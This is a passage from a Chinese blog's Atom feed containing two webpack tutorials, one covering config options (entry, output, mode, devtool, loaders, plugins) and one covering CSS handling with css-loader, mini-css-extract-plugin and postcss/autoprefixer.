    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="webpack" scheme="http://aiolimp.com/categories/webpack/"/>
    
    
    <category term="webpack" scheme="http://aiolimp.com/tags/webpack/"/>
    
  </entry>
  
  <entry>
    <title>webpack配置文件</title>
    <link href="http://aiolimp.com/2021/08/06/webpack%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"/>
    <id>http://aiolimp.com/2021/08/06/webpack%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</id>
    <published>2021-08-06T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.213Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Webpack配置文件"><a href="#Webpack配置文件" class="headerlink" title="Webpack配置文件"></a>Webpack配置文件</h1><p>webpack的配置文件主要是<code>webpack.config.js</code>。</p><p>如果没有此配置文件，它默认会使用自己的默认配置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  entry: <span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    path: path.resolve(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">    filename: <span class="string">&#x27;main.js&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="entry和output"><a href="#entry和output" class="headerlink" title="entry和output"></a>entry和output</h2><p><code>entry</code>选项是用来配置入口文件的，它可以是字符串、数组或者对象类型。<code>webpack</code>默认只支持<code>js</code>和<code>json</code>文件作为入口文件，因此如果引入其他类型文件会保存。</p><p><code>output</code>选项是设置输出配置，<strong>该选项必须是对象类型</strong>，不能是其它类型格式。在<code>output</code>对象中，必填的两个选项就是导出路径<code>path</code>和导出<code>bundle</code>文件名称<code>filename</code>。其中<code>path</code>选项必须为绝对路径。</p><p><code>entry</code>和<code>output</code>的配置，对于不同的应用场景的配置也会有所不同。</p><h3 id="单入口单输出"><a href="#单入口单输出" class="headerlink" title="单入口单输出"></a>单入口单输出</h3><p>我们最普遍的就是单个入口文件，然后打包成单个<code>bundle</code>文件。这种应用场景下，<code>entry</code>可以使用字符串的形式，则跟默认配置文件类似：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">entry: <span class="string">&#x27;./src/index.js&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="多入口单输出"><a href="#多入口单输出" class="headerlink" title="多入口单输出"></a>多入口单输出</h3><p>当我们的项目需要有多个入口文件，但只需要一个输出<code>bundle</code>的时候，这时候<code>entry</code>可以使用数组的形式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">entry: [<span class="string">&#x27;./src/index_1.js&#x27;</span>, <span class="string">&#x27;./src/index_2.js&#x27;</span>]</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意：此时其实只有一个chunk</strong></p></blockquote><h3 id="多入口多输出"><a href="#多入口多输出" class="headerlink" title="多入口多输出"></a>多入口多输出</h3><p>当我们的项目同时多个入口文件，并且它们需要单独打包，也就是意味着会有多个<code>bundle</code>文件输出，此时我们的<code>entry</code>需要使用对象形式，并且对象<code>key</code>对应的对应<code>chunk</code>的名称。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">entry: &#123;</span><br><span class="line">  index: <span class="string">&quot;./src/index.js&quot;</span>,  <span class="comment">// chunkName为index</span></span><br><span class="line">  main: <span class="string">&quot;./src/main.js&quot;</span>     <span class="comment">// chunkName为main</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，我们的<code>output.filename</code>也不能写死了，这时候<code>webpack</code>提供了一个占位符<code>[name]</code>给我们使用，它会自动替换为对应的<code>chunkName</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">output: &#123;</span><br><span class="line">   path: path.resolve(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">   filename: <span class="string">&#x27;[name].js&#x27;</span>  <span class="comment">// [name]占位符会自动替换为chunkName</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>根据上面的配置，最后会打包出<code>index.js</code>和<code>main.js</code>。</p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>在单入口单输出的应用场景下，<code>entry</code>也可以使用对象的形式，从而来自定义<code>chunkName</code>，然后<code>output.filename</code>也使用<code>[name]</code>占位符来自动匹配。当然也可以使用数组，但是不太大必要。</p><p>当<code>entry</code>使用数组或字符串的时候，<code>chunkName</code>默认为<code>main</code>，因此如果<code>output.filename</code>使用<code>[name]</code>占位符的时候，会自动替换为<code>main</code>。</p><h2 id="mode"><a href="#mode" class="headerlink" title="mode"></a>mode</h2><p>在前面的打包测试的时候，命令行都会报一个警告：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WARNING in configuration</span><br><span class="line">The &#x27;mode&#x27; option has not been set, webpack will fallback to &#x27;production&#x27; for this value.</span><br><span class="line">Set &#x27;mode&#x27; option to &#x27;development&#x27; or &#x27;production&#x27; to enable defaults for each environment.</span><br></pre></td></tr></table></figure><p>这是因为<code>webpack</code>需要我们配置<code>mode</code>选项。</p><p>wepack给我们提供了三个选项，即<code>none</code>、<code>development</code>和<code>production</code>，而默认就是<code>production</code>。</p><p>三者的区别呢，在于<code>webpack</code>自带的代码压缩和优化插件使用。</p><ul><li>**<code>none</code>**：不使用任何默认优化选项；</li><li>**<code>development</code>**：指的是开发环境，会默认开启一些有利于开发调试的选项，比如<code>NamedModulesPlugin</code>和<code>NamedChunksPlugin</code>，分别是给<code>module</code>和<code>chunk</code>命名的，而默认是一个数组，对应的<code>chunkName</code>也只是下标，不利于开发调试；</li><li>**<code>production</code>**：指的是生产环境，则会开启代码压缩和代码性能优化的插件，从而打包出来的文件也相对<code>none</code>和<code>development</code>小很多。</li></ul><blockquote><p>当我们设置mode之后，我们可以在<code>process.env.NODE_ENV</code>获取到当前的环境</p></blockquote><p>因此我们可以在配置文件上文件上配置<code>mode</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    mode:<span class="string">&#x27;development&#x27;</span>, <span class="comment">// 开发模式</span></span><br><span class="line">    entry: <span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">        filename: <span class="string">&#x27;[name].js&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>webpack</code>也给我们提供了另一种方式，就是在命令行中配置，也就是加上<code>--mode</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// package.json</span></span><br><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;dev&quot;</span>: <span class="string">&quot;webpack --mode development&quot;</span>,</span><br><span class="line">  <span class="string">&quot;build&quot;</span>: <span class="string">&quot;webpack --mode production&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="devtool"><a href="#devtool" class="headerlink" title="devtool"></a>devtool</h2><p>聊完<code>mode</code>后，说到开发调试，不难想起的就是<code>sourceMap</code>。而我们可以在配置文件中，使用<code>devtool</code>开启它。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    entry: <span class="string">&#x27;./src/index.js&#x27;</span>,</span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">        filename: <span class="string">&#x27;[name].js&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  <span class="comment">// 开启source-map</span></span><br><span class="line">    devtool: <span class="string">&quot;source-map&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>打包后，你的<code>dist</code>中就会多了一个<code>main.js.map</code>文件。</p><p>当然，官方不止提供这么一个选项，具体的可以去<a href="https://link.juejin.cn/?target=https://webpack.docschina.org/configuration/devtool/%23devtool">官网</a>看看，这里就说其他几个比较常用的选项。</p><ul><li>**<code>none</code>**：不会生成<code>sourceMap</code>；</li><li>**<code>eval</code>**：每个模块都会使用<code>eval()</code>执行，不建议生成环境中使用；</li><li>**<code>cheap-source-map</code>**：生成<code>sourceMap</code>，但是没有列映射，则只会提醒是在代码的第几行，不会提示到第几列；</li><li>**<code>inline-source-map</code>**：会生成<code>sourceMap</code>，但不会生成<code>map</code>文件，而是将<code>sourceMap</code>放在打包文件中。</li></ul><h2 id="module"><a href="#module" class="headerlink" title="module"></a>module</h2><p>前面我们有提到过，就是<code>webpack</code>的入口文件只能接收<code>JavaScript</code>文件和<code>JSON</code>文件。</p><p>但我们通常项目还会有其他类型的文件，比如<code>html</code>、<code>css</code>、图片、字体等等，这时候我们就需要用到第三方<code>loader</code>来帮助<code>webpack</code>来解析这些文件。理论上只要有相应的<code>loader</code>，就可以处理任何类型的文件。</p><blockquote><p>在<code>webpack</code><a href="https://link.juejin.cn/?target=https://webpack.docschina.org/loaders/">官网</a>其实提供了很多<code>loader</code>，已经能满足我们日常使用，当然我们也可以去<code>github</code>找找别人写的<code>loader</code>或者自己手写<code>loader</code>来使用。</p></blockquote><p>而对于<code>loader</code>的配置，是写着<code>module</code>选项里面的。<code>module</code>选项是一个对象，它里面有一个<code>rules</code>属性，是一个数组，在里面我们可以配置多个匹配规则。</p><p>而匹配规则是一个对象，会有<code>test</code>属性和<code>use</code>属性，<code>test</code>属性一般是正则表达式，用来识别文件类型，而<code>use</code>属性是一个数组，里面用来存放对该文件类型使用的<code>loader</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">        &#123;</span><br><span class="line">          test: <span class="regexp">/\.css$/</span>,  <span class="comment">// 识别css文件</span></span><br><span class="line">          use: [<span class="string">&#x27;style-loader&#x27;</span>, <span class="string">&#x27;css-loader&#x27;</span>]  <span class="comment">// 对css文件使用的三个loader</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于<code>use</code>数组的顺序是有要求的，<code>webpack</code>会根据<strong>自后向前</strong>的规则去执行<code>loader</code>。也就是说，上面的例子<code>webpack</code>会先执行<code>css-loader</code>，再执行<code>style-loader</code>。</p><p>其次，当我们需要对对应<code>loader</code>提供配置的时候，我们可以选用对象写法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">        &#123;</span><br><span class="line">          test: <span class="regexp">/\.css$/</span>,  </span><br><span class="line">          use: [</span><br><span class="line">            <span class="string">&#x27;style-loader&#x27;</span>, </span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">// loader名称</span></span><br><span class="line">              loader: <span class="string">&#x27;css-loader&#x27;</span>,</span><br><span class="line">              <span class="comment">// loader选项</span></span><br><span class="line">              options: &#123;</span><br><span class="line">                  ... </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ] </span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在后面我们根据实际应用场景再讲讲<code>module</code>的使用。</p><h2 id="plugins"><a href="#plugins" class="headerlink" title="plugins"></a>plugins</h2><p><code>webpack</code>还提供了一个<code>plugins</code>选项，让我们可以使用一些第三方插件，因此我们可以使用第三方插件来实现打包优化、资源管理、注入环境变量等任务。</p><blockquote><p>同样的，<code>webpack</code><a href="https://link.juejin.cn/?target=https://webpack.docschina.org/plugins/">官方</a>也提供了很多<code>plugin</code>。</p></blockquote><p><code>plugins</code>选项是一个数组，里面可以放入多个<code>plugin</code>插件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> htmlWebpackPlugin(),</span><br><span class="line">  <span class="keyword">new</span> CleanWebpackPlugin(),</span><br><span class="line">  <span class="keyword">new</span> miniCssExtractPlugin(),</span><br><span class="line">  <span class="keyword">new</span> TxtWebpackPlugin()</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>而对于<code>plugins</code>数组对排序位置是没有要求，因为在<code>plugin</code>的实现中，<code>webpack</code>会通过打包过程的生命周期钩子，因此在插件逻辑中就已经设置好需要在哪个生命周期执行哪些任务。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="webpack" scheme="http://aiolimp.com/categories/webpack/"/>
    
    
    <category term="webpack" scheme="http://aiolimp.com/tags/webpack/"/>
    
  </entry>
  
  <entry>
    <title>webpack常见应用场景</title>
    <link href="http://aiolimp.com/2021/08/06/webpack%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/"/>
    <id>http://aiolimp.com/2021/08/06/webpack%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/</id>
    <published>2021-08-06T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.213Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="CSS处理"><a href="#CSS处理" class="headerlink" title="CSS处理"></a>CSS处理</h2><h3 id="解析CSS文件"><a href="#解析CSS文件" class="headerlink" title="解析CSS文件"></a>解析CSS文件</h3><p>在前面的例子也能看到，我们解析<code>css</code>需要用到的<code>loader</code>有<code>css-loader</code>和<code>style-loader</code>。<code>css-loader</code>主要用来解析<code>css</code>文件，而<code>style-loader</code>是将<code>css</code>渲染到<code>DOM</code>节点上。</p><p>首先我们来安装一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> css-loader -&gt; 6.2.0;  style-loader -&gt; 3.2.1</span></span><br><span class="line">yarn add css-loader style-loader -D</span><br></pre></td></tr></table></figure><p>然后我们新建一个<code>css</code>文件。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* style.css */</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#222</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在<code>index.js</code>引入一下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;./style.css&quot;</span>;</span><br></pre></td></tr></table></figure><p>紧接着我们配置一下<code>webpack</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">   ...</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.css$/</span>,  <span class="comment">// 识别css文件</span></span><br><span class="line">        use: [<span class="string">&#x27;style-loader&#x27;</span>, <span class="string">&#x27;css-loader&#x27;</span>]  <span class="comment">// 先使用css-loader,再使用style-loader</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  </span><br><span class="line">   ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这时候我们打包一下，会发现<code>dist</code>路径下只有<code>main.js</code>和<code>index.html</code>。但打开一下<code>index.html</code>会发现<code>css</code>是生效的。</p><p>这是因为<code>style-loader</code>是将<code>css</code>代码插入到了<code>main.js</code>当中去了。</p><h3 id="打包css文件"><a href="#打包css文件" class="headerlink" title="打包css文件"></a>打包css文件</h3><p>如果我们不想将<code>css</code>代码放进<code>js</code>中，而是直接导出一份<code>css</code>文件的话，就得使用另一个插件——<code>mini-css-extract-plugin</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 2.1.0</span></span><br><span class="line">yarn add mini-css-extract-plugin -D</span><br></pre></td></tr></table></figure><p>然后将其引入到配置文件，并且在<code>plugins</code>引入。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> miniCssExtractPlugin = <span class="built_in">require</span>(<span class="string">&#x27;mini-css-extract-plugin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    ...</span><br><span class="line">  </span><br><span class="line">    plugins: [</span><br><span class="line">      <span class="comment">// 使用miniCssExtractPlugin插件</span></span><br><span class="line">        <span class="keyword">new</span> miniCssExtractPlugin(&#123;</span><br><span class="line">          filename: <span class="string">&quot;[name].css&quot;</span>  <span class="comment">// 设置导出css名称，[name]占位符对应chunkName</span></span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>紧接着，我们还需要更改一下<code>loader</code>，我们不再使用<code>style-loader</code>，而是使用<code>miniCssExtractPlugin</code>提供的<code>loader</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> miniCssExtractPlugin = <span class="built_in">require</span>(<span class="string">&#x27;mini-css-extract-plugin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    ...</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">            &#123;</span><br><span class="line">                test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">              <span class="comment">// 使用miniCssExtractPlugin.loader替换style-loader</span></span><br><span class="line">                use: [miniCssExtractPlugin.loader,<span class="string">&#x27;css-loader&#x27;</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [</span><br><span class="line">        <span class="keyword">new</span> miniCssExtractPlugin(&#123;</span><br><span class="line">          filename: <span class="string">&quot;[name].css&quot;</span> </span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来打包一下，<code>dist</code>路径下就会多出一个<code>main.css</code>文件，并且在<code>index.html</code>中也会自动引入。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">defer</span> <span class="attr">src</span>=<span class="string">&quot;main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;main.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    HelloWorld！</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="css添加浏览器前缀"><a href="#css添加浏览器前缀" class="headerlink" title="css添加浏览器前缀"></a>css添加浏览器前缀</h3><p>当我们使用一下<code>css</code>新特性的时候，可能需要考虑到浏览器兼容的问题，这时候可能需要对一些<code>css</code>属性添加浏览器前缀。而这类工作，其实可以交给<code>webpack</code>去实现。准确来说，是交给<code>postcss</code>去实现。</p><p><code>postcss</code>对于<code>css</code>犹如<code>babel</code>对于<code>JavaScript</code>，它专注于对转换<code>css</code>，比如添加前缀兼容、压缩<code>css</code>代码等等。</p><p>首先我们需要先安装一下<code>postcss</code>和<code>post-css-loader</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> postcss -&gt; 8.3.6，postcss-loader -&gt; 6.1.1</span></span><br><span class="line">yarn add postcss postcss-loader -D</span><br></pre></td></tr></table></figure><p>接下来，我们在<code>webpack</code>配置文件先引入<code>postcss-loader</code>，它的顺序是在<code>css-loader</code>之前执行的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rules: [</span><br><span class="line">  &#123;</span><br><span class="line">    test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">    <span class="comment">// 引入postcss-loader</span></span><br><span class="line">    use: [miniCssExtractPlugin.loader, <span class="string">&#x27;css-loader&#x27;</span>, <span class="string">&#x27;postcss-loader&#x27;</span>]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>接下来配置<code>postcss</code>的工作，就不在<code>webpack</code>的配置文件里面了。<code>postcss</code>自身也是有配置文件的，我们需要在项目根路径下新建一个<code>postcss,config.js</code>。然后里面也有一个配置项，为<code>plugins</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    plugins: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这也意味着，<code>postcss</code>自身也支持很多第三方插件使用。</p><p>现在我们想实现的添加前缀的功能，需要安装的插件叫<code>autoprefixer</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1.22.10</span></span><br><span class="line">yarn add autoprefixer -D</span><br></pre></td></tr></table></figure><p>然后我们只需要引入到<code>postcss</code>的配置文件中，并且它里面会有一个配置选项，叫<code>overrideBrowserslist</code>，是用来填写适用浏览器的版本。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    plugins: [</span><br><span class="line">        <span class="comment">// 将css编译为适应于多版本浏览器</span></span><br><span class="line">        <span class="built_in">require</span>(<span class="string">&#x27;autoprefixer&#x27;</span>)(&#123;</span><br><span class="line">            <span class="comment">// 覆盖浏览器版本</span></span><br><span class="line">          <span class="comment">// last 2 versions: 兼容各个浏览器最新的两个版本</span></span><br><span class="line">          <span class="comment">// &gt; 1%: 浏览器全球使用占有率大于1%</span></span><br><span class="line">            overrideBrowserslist: [<span class="string">&#x27;last 2 versions&#x27;</span>, <span class="string">&#x27;&gt; 1%&#x27;</span>]</span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于<code>overrideBrowserslist</code>的选项填写，我们可以去参考一下<a href="https://link.juejin.cn/?target=https://github.com/browserslist/browserslist">browserslist</a>，这里就不多讲。</p><p>当然，我们其实可以在<code>package.json</code>中填写兼容浏览器信息，或者使用<code>browserslist</code>配置文件<code>.browserslistrc</code>来填写，这样子如果我们以后使用其他插件也需要考虑到兼容浏览器的时候，就可以统一用到，比如说<code>babel</code>。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 